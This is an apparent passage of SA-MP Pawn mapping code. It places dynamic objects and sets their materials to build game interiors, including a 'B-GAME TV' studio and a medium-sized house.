	nebeskaudica = CreateDynamicObjectEx(19453,221.411,1768.983,3338.729,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 8550, "laconcha", "vegaspawnwall_128", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19453,225.085,1767.433,3338.729,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 8550, "laconcha", "vegaspawnwall_128", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19379,222.712,1757.847,3340.554,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 11301, "carshow_sfse", "ws_officy_ceiling", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19379,212.206,1757.803,3340.554,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 11301, "carshow_sfse", "ws_officy_ceiling", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19379,219.793,1767.378,3340.554,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 11301, "carshow_sfse", "ws_officy_ceiling", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19379,219.869,1748.409,3340.554,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 11301, "carshow_sfse", "ws_officy_ceiling", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19430,221.616,1750.548,3336.891,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19430,221.626,1751.397,3336.891,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(2679,221.690,1749.682,3337.666,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2679,221.692,1752.108,3337.666,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2679,219.609,1749.514,3337.666,90.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2679,219.624,1753.104,3337.666,90.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2679,219.128,1750.856,3337.666,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2679,219.134,1751.629,3337.666,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19430,219.838,1749.445,3336.891,90.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19430,219.439,1752.434,3336.891,90.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19430,219.077,1751.143,3336.891,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19430,221.025,1751.205,3336.891,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19357,219.113,1751.628,3337.051,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19357,219.199,1748.422,3337.051,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(2679,222.088,1751.273,3337.547,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2679,222.283,1751.287,3337.367,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,217.437,1760.377,3338.034,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,217.437,1760.377,3337.718,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,217.437,1760.377,3337.380,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19087,222.041,1752.311,3337.590,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19087,222.250,1752.322,3337.435,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19087,222.037,1749.968,3337.590,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19087,222.246,1749.978,3337.435,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18762,220.083,1765.841,3335.526,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19430,220.004,1765.805,3337.943,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(2124,220.949,1765.125,3337.964,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 10765, "airportgnd_sfse", "white", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(2124,220.906,1766.583,3337.964,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 10765, "airportgnd_sfse", "white", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(2124,219.189,1764.984,3337.964,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 10765, "airportgnd_sfse", "white", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(2124,219.168,1766.471,3337.964,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 1, 10765, "airportgnd_sfse", "white", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(2206,218.115,1761.878,3332.711,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(1714,219.196,1760.981,3332.682,0.000,0.000,-135.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	nebeskaudica = CreateDynamicObjectEx(2272,219.090,1761.669,3333.592,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 10765, "airportgnd_sfse", "white", 0xFF676767);
	nebeskaudica = CreateDynamicObjectEx(2272,219.113,1762.670,3333.592,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, -1, "none", "none", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(1906,219.074,1762.137,3333.671,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF00FF00);
	nebeskaudica = CreateDynamicObjectEx(1906,220.350,1753.377,3333.570,-90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF00FF00);
	nebeskaudica = CreateDynamicObjectEx(19927,224.594,1768.012,3337.131,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19916,224.550,1766.643,3337.131,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	nebeskaudica = CreateDynamicObjectEx(19928,224.701,1765.838,3337.131,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19924,222.616,1767.948,3340.061,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	nebeskaudica = CreateDynamicObjectEx(19923,222.516,1767.941,3337.022,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19893,219.598,1759.638,3337.541,0.000,0.000,47.599,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14571, "chinese_furn", "ab_tv_noise", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19327,221.425,1753.414,3333.595,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterialText(nebeskaudica, 0, "{0066FF}B{FFFFFF}-GAME TV", 140, "Ariel", 30, 1, 0xFF808080, 0x00000000, 1);
	nebeskaudica = CreateDynamicObjectEx(2816,221.628,1755.723,3333.017,0.000,0.000,0.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(2257,210.975,1762.431,3334.394,0.000,0.000,0.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(2255,219.640,1758.015,3338.770,0.000,0.000,90.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(2344,221.286,1755.448,3333.009,0.000,0.000,25.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(19603,218.612,1750.388,3337.184,0.000,0.000,0.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(19938,224.508,1764.480,3337.022,0.000,0.000,90.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(19808,219.090,1761.798,3333.672,0.000,0.000,0.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(2811,216.945,1753.726,3332.641,0.000,0.000,0.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(2258,214.378,1762.432,3336.425,0.000,0.000,0.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(19317,214.429,1753.548,3333.468,-14.000,0.000,180.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(19318,215.052,1753.546,3333.468,-14.000,0.000,180.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(2261,210.024,1757.045,3334.155,0.000,0.000,90.000,300.000,300.000);
	nebeskaudica = CreateDynamicObjectEx(2262,210.024,1759.363,3333.781,0.000,0.000,90.000,300.000,300.000);

	//dodatno
	CreateDynamicObject(14842, 219.14490, 1750.14868, 3338.25903,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2749, 219.03346, 1752.93103, 3337.70190,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2751, 219.06940, 1752.70886, 3337.74390,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2752, 219.34850, 1752.90991, 3337.70190,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2750, 222.25540, 1749.66846, 3338.01685,   90.00000, 0.00000, 0.00000);
	CreateDynamicObject(2751, 223.26601, 1749.56775, 3338.01685,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2261, 213.18069, 1753.83789, 3334.87671,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2262, 215.57770, 1753.83789, 3335.67578,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1734, 221.38811, 1757.57739, 3336.09448,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1731, 211.91670, 1753.48938, 3335.18799,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1731, 214.36070, 1753.48938, 3335.18799,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1731, 212.90370, 1762.27844, 3335.75195,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1731, 216.66370, 1762.27844, 3339.27710,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1734, 221.80730, 1757.79431, 3340.46240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 221.74730, 1751.26831, 3340.46313,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 220.14900, 1765.79993, 3340.46289,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1822, 209.56509, 1761.34851, 3332.71240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2855, 210.06680, 1761.84155, 3333.18994,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19825, 217.98531, 1765.86792, 3339.71289,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19581, 222.90199, 1768.54272, 3338.03882,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19582, 222.88100, 1768.07971, 3338.05371,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19583, 222.88730, 1767.21521, 3338.01172,   0.00000, 0.00000, -135.00000);
	CreateDynamicObject(19582, 222.88100, 1767.32776, 3338.05371,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19582, 222.92799, 1767.32776, 3338.05981,   0.00000, 0.00000, 20.00000);
	CreateDynamicObject(19585, 224.80040, 1768.76746, 3338.20508,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19584, 224.42940, 1768.76746, 3338.20508,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19579, 222.34663, 1767.18311, 3338.00342,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19883, 222.27499, 1767.34045, 3338.00366,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19883, 222.34000, 1767.38354, 3338.00781,   0.00000, 0.00000, -22.00000);
	CreateDynamicObject(19883, 222.24600, 1767.47754, 3338.00781,   0.00000, 0.00000, -22.00000);
	CreateDynamicObject(11744, 222.64951, 1768.60974, 3338.00562,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19882, 222.64690, 1768.62622, 3338.01538,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 220.59070, 1766.63879, 3338.03394,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 219.46870, 1766.50281, 3338.03394,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 219.46870, 1764.97278, 3338.03394,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 220.52271, 1765.14282, 3338.03394,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19818, 220.38879, 1765.33008, 3338.09937,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19818, 220.38879, 1766.82605, 3338.09937,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19818, 219.57280, 1766.21411, 3338.09937,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19818, 219.57280, 1764.71814, 3338.09937,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19822, 219.98531, 1765.80237, 3338.03149,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19824, 219.98759, 1765.92334, 3338.03149,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11742, 220.53529, 1765.15625, 3338.03345,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11742, 220.60330, 1766.65234, 3338.03345,   0.00000, 0.00000, -46.00000);
	CreateDynamicObject(11742, 219.48129, 1766.48242, 3338.03345,   0.00000, -90.00000, -46.00000);
	CreateDynamicObject(2267, 220.71150, 1762.67932, 3339.44458,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2811, 218.27510, 1763.01294, 3337.13086,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2811, 218.27510, 1768.53491, 3337.13086,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2267, 224.93880, 1751.08923, 3338.99414,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19828, 211.91830, 1753.34302, 3334.66113,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19828, 218.39960, 1757.13513, 3334.22778,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19828, 219.14120, 1759.16321, 3338.08301,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19828, 219.14120, 1756.71521, 3338.08301,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19828, 222.91580, 1753.34424, 3338.43530,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19828, 222.69980, 1753.34424, 3338.43530,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2562, 224.88451, 1749.45093, 3337.13110,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2811, 219.74490, 1755.29346, 3337.11255,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2811, 219.74490, 1760.59741, 3337.11255,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2262, 221.81081, 1753.82935, 3338.84351,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2261, 220.10880, 1753.82935, 3338.05151,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2270, 224.53149, 1754.88879, 3338.74927,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2270, 224.53149, 1760.97485, 3338.74927,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2257, 209.61560, 1760.25085, 3336.77808,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2257, 209.61560, 1755.54688, 3338.63989,   0.00000, 0.00000, 90.00000);
	
	
	
	
	//----------------------------------|| Interior CASA Mediu ||--------------

	new housedjord;
	housedjord = CreateDynamicObjectEx(19378,247.573,-1848.020,3332.277,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	housedjord = CreateDynamicObjectEx(19450,242.268,-1848.020,3334.100,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19450,245.822,-1852.807,3334.100,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19450,239.831,-1850.032,3331.182,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19378,239.384,-1854.778,3332.847,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	housedjord = CreateDynamicObjectEx(19450,244.561,-1854.765,3331.182,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(1506,242.554,-1851.335,3332.903,0.000,0.000,-45.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0x00000000);
	housedjord = CreateDynamicObjectEx(19087,244.619,-1849.984,3333.808,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19089,244.619,-1849.984,3333.795,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19089,244.619,-1849.984,3333.355,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,243.878,-1849.986,3332.201,0.000,0.000,180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,243.876,-1850.141,3332.327,0.000,0.000,180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,243.864,-1850.227,3332.455,0.000,0.000,180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19450,238.399,-1846.203,3334.100,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19450,252.731,-1846.220,3334.100,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19450,247.701,-1846.209,3336.230,0.000,180.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19089,249.784,-1846.267,3332.365,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19089,247.899,-1846.278,3332.300,0.000,180.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19089,243.225,-1846.267,3332.300,0.000,180.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19089,249.784,-1846.267,3334.469,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19378,258.035,-1848.021,3332.277,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	housedjord = CreateDynamicObjectEx(19451,250.592,-1857.532,3334.100,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 9524, "blokmodb", "lombard_build1_1", 0x00000000);
	housedjord = CreateDynamicObjectEx(18762,250.120,-1852.954,3331.890,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(18762,250.102,-1849.967,3333.759,0.000,180.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(18762,250.138,-1853.204,3334.644,0.000,180.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(18762,250.121,-1852.000,3335.161,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
